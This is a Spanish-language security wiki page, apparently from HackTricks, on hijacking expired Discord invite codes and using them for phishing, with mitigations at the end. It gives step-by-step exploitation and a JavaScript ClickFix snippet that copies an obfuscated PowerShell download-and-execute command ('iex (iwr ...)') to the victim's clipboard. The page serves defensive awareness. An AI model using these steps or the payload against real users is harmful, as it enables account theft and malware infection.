# Discord Invite Hijacking

{{#include ../../banners/hacktricks-training.md}}

La vulnerabilidad del sistema de invitaciones de Discord permite a los actores de amenazas reclamar códigos de invitación expirados o eliminados (temporales, permanentes o personalizados) como nuevos enlaces personalizados en cualquier servidor con Boost de Nivel 3. Al normalizar todos los códigos a minúsculas, los atacantes pueden pre-registrar códigos de invitación conocidos y secuestrar silenciosamente el tráfico una vez que el enlace original expire o el servidor de origen pierda su boost.

## Tipos de Invitaciones y Riesgo de Secuestro

| Tipo de Invitación     | ¿Secuestrable? | Condición / Comentarios                                                                                       |
|-----------------------|-------------|------------------------------------------------------------------------------------------------------------|
| Enlace de Invitación Temporal | ✅          | Después de la expiración, el código se vuelve disponible y puede ser re-registrado como una URL personalizada por un servidor con boost. |
| Enlace de Invitación Permanente | ⚠️          | Si se elimina y consiste solo en letras minúsculas y dígitos, el código puede volverse disponible nuevamente.        |
| Enlace Personalizado    | ✅          | Si el servidor original pierde su Boost de Nivel 3, su invitación personalizada se vuelve disponible para un nuevo registro.    |

## Pasos de Explotación

1. Reconocimiento
- Monitorear fuentes públicas (foros, redes sociales, canales de Telegram) en busca de enlaces de invitación que coincidan con el patrón `discord.gg/{code}` o `discord.com/invite/{code}`.
- Recopilar códigos de invitación de interés (temporales o personalizados).
2. Pre-registro
- Crear o usar un servidor de Discord existente con privilegios de Boost de Nivel 3.
- En **Configuración del Servidor → URL Personalizada**, intentar asignar el código de invitación objetivo. Si es aceptado, el código es reservado por el servidor malicioso.
3. Activación del Secuestro
- Para invitaciones temporales, esperar hasta que la invitación original expire (o eliminarla manualmente si controlas la fuente).
- Para códigos que contienen mayúsculas, la variante en minúsculas puede ser reclamada de inmediato, aunque la redirección solo se activa después de la expiración.
4. Redirección Silenciosa
- Los usuarios que visitan el antiguo enlace son enviados sin problemas al servidor controlado por el atacante una vez que el secuestro está activo.

## Flujo de Phishing a través del Servidor de Discord

1. Restringir los canales del servidor para que solo sea visible un canal **#verify**.
2. Desplegar un bot (por ejemplo, **Safeguard#0786**) para solicitar a los recién llegados que verifiquen a través de OAuth2.
3. El bot redirige a los usuarios a un sitio de phishing (por ejemplo, `captchaguard.me`) bajo la apariencia de un paso de CAPTCHA o verificación.
4. Implementar el truco de UX **ClickFix**:
- Mostrar un mensaje de CAPTCHA roto.
- Guiar a los usuarios para que abran el diálogo **Win+R**, peguen un comando de PowerShell pre-cargado y presionen Enter.

### Ejemplo de Inyección de Portapapeles ClickFix
```javascript
// Copy malicious PowerShell command to clipboard
const cmd = `powershell -NoExit -Command "$r='NJjeywEMXp3L3Fmcv02bj5ibpJWZ0NXYw9yL6MHc0RHa';` +
`$u=($r[-1..-($r.Length)]-join '');` +
`$url=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($u));` +
`iex (iwr -Uri $url)"`;
navigator.clipboard.writeText(cmd);
```
Este enfoque evita descargas directas de archivos y aprovecha elementos de interfaz de usuario familiares para reducir la sospecha del usuario.

## Mitigaciones

- Utilizar enlaces de invitación permanentes que contengan al menos una letra mayúscula o un carácter no alfanumérico (nunca expiran, no reutilizables).
- Rotar regularmente los códigos de invitación y revocar enlaces antiguos.
- Monitorear el estado de impulso del servidor de Discord y las reclamaciones de URL de vanidad.
- Educar a los usuarios para que verifiquen la autenticidad del servidor y eviten ejecutar comandos pegados desde el portapapeles.

## Referencias

- From Trust to Threat: Hijacked Discord Invites Used for Multi-Stage Malware Delivery – [https://research.checkpoint.com/2025/from-trust-to-threat-hijacked-discord-invites-used-for-multi-stage-malware-delivery/](https://research.checkpoint.com/2025/from-trust-to-threat-hijacked-discord-invites-used-for-multi-stage-malware-delivery/)
- Discord Custom Invite Link Documentation – [https://support.discord.com/hc/en-us/articles/115001542132-Custom-Invite-Link](https://support.discord.com/hc/en-us/articles/115001542132-Custom-Invite-Link)

{{#include ../../banners/hacktricks-training.md}}
